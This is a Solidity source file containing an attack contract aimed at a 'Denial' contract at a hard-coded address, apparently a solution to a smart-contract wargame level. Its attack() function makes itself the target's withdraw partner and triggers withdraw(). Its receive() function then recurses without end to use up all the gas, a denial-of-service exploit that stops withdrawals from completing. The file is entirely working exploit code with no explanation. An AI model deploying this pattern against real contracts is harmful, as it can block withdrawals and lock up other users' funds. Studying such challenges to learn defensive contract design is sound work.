// SPDX_LICENSE_IDENTIFIER: MIT
pragma solidity ^0.8.6;
interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}
contract Denier {
    address internal immutable target = 0xbEb11A4fCC36e449d75AD2cB5f3B7Bc0214Ac15D;
    function recurse() public {
        recurse();
    }
    receive() external payable {
        recurse();
    }
    function attack() public {
        Denial(target).setWithdrawPartner(address(this));
        Denial(target).withdraw();
    }
}